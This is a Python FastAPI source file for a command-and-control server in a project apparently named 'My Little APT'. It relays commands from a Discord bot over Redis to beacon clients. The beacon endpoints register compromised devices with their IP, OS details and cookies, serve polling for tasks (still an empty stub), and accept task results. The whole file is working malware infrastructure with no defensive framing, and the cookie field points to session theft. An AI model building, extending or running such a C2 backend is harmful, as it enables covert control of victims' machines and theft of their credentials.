"""
C2 Server — FastAPI application.
Acts as the intermediary between the Discord bot (admin panel) and the
future client app (beacon). Commands arrive via Redis Pub/Sub and beacon
devices communicate over HTTP.
"""

import asyncio
import logging
from contextlib import asynccontextmanager
from datetime import datetime, timezone
from typing import AsyncGenerator

from fastapi import FastAPI, HTTPException, status

from command_handler import CommandHandler
from config import SERVER_HOST, SERVER_PORT, VALID_BEACON_INTERVALS
from message_queue import MessageBroker
from models import (
    BeaconCheckIn,
    DeviceInfo,
    ResponseStatus,
    ServerConfig,
    TaskResponse,
    TaskResult,
)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("c2-server")

# ---------------------------------------------------------------------------
# Shared instances
# ---------------------------------------------------------------------------

broker = MessageBroker()
handler = CommandHandler()
_listener_task: asyncio.Task | None = None  # type: ignore[type-arg]


# ---------------------------------------------------------------------------
# Lifespan (startup / shutdown)
# ---------------------------------------------------------------------------

@asynccontextmanager
async def lifespan(application: FastAPI) -> AsyncGenerator[None, None]:
    """Connect to Redis on startup, disconnect on shutdown."""
    global _listener_task
    await broker.connect()
    _listener_task = asyncio.create_task(_command_listener())
    logger.info("C2 server started — listening for commands")
    yield
    broker.stop_listening()
    if _listener_task:
        _listener_task.cancel()
        try:
            await _listener_task
        except asyncio.CancelledError:
            pass
    await broker.disconnect()
    logger.info("C2 server shut down")


async def _command_listener() -> None:
    """Background task: listens for commands and publishes responses."""
    async def on_command(raw: dict) -> None:
        response = await handler.handle_command(raw)
        await broker.publish_response(response)

    await broker.subscribe_commands(on_command)


# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(
    title="My Little APT — C2 Server",
    description="Command-and-control backend for the my-little-apt project.",
    version="0.1.0",
    lifespan=lifespan,
)


# ---------------------------------------------------------------------------
# Health
# ---------------------------------------------------------------------------

@app.get("/health", tags=["health"])
async def health_check() -> dict:
    """Basic health check endpoint."""
    return {
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "config": {
            "beacon_interval": handler.server_config.beacon_interval,
            "communication_protocol": handler.server_config.communication_protocol,
        },
    }


# ---------------------------------------------------------------------------
# Beacon endpoints (for the future app)
# ---------------------------------------------------------------------------

@app.post(
    "/beacon/check-in",
    tags=["beacon"],
    status_code=status.HTTP_200_OK,
)
async def beacon_check_in(payload: BeaconCheckIn) -> dict:
    """
    Beacon registers or updates its presence.
    Returns the current server configuration so the app knows the
    expected interval and protocol.
    """
    device = DeviceInfo(
        name=payload.device_name,
        ip=payload.ip_address,
        os_info=payload.os_info,
        status="online",
        cookies=payload.cookies,
        last_seen=datetime.now(timezone.utc),
    )
    handler.register_device(device)
    return {
        "status": "registered",
        "beacon_interval": handler.server_config.beacon_interval,
        "communication_protocol": handler.server_config.communication_protocol,
    }


@app.get("/beacon/tasks/{device_name}", tags=["beacon"])
async def beacon_get_tasks(device_name: str) -> dict:
    """
    Beacon polls for pending tasks.
    Returns any tasks queued for the requesting device.
    """
    device = handler.get_device(device_name)
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Device '{device_name}' is not registered. "
                   f"Call /beacon/check-in first.",
        )

    # Update last_seen timestamp on poll.
    device.last_seen = datetime.now(timezone.utc)

    # For now, return an empty task list.
    # Future: pull from handler.pending_tasks filtered by device.
    return {
        "device": device_name,
        "tasks": [],
        "beacon_interval": handler.server_config.beacon_interval,
    }


@app.post("/beacon/result", tags=["beacon"])
async def beacon_submit_result(result: TaskResult) -> dict:
    """Beacon submits the result of a completed task."""
    device = handler.get_device(result.device_name)
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Device '{result.device_name}' is not registered.",
        )

    logger.info(
        "Task result from %s (task_id=%s, success=%s)",
        result.device_name,
        result.task_id,
        result.success,
    )
    return {"status": "accepted", "task_id": result.task_id}


@app.get("/beacon/config", tags=["beacon"])
async def beacon_get_config() -> dict:
    """Return the current server configuration for beacons."""
    return {
        "beacon_interval": handler.server_config.beacon_interval,
        "communication_protocol": handler.server_config.communication_protocol,
        "valid_intervals": VALID_BEACON_INTERVALS,
    }


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "server:app",
        host=SERVER_HOST,
        port=SERVER_PORT,
        reload=True,
    )
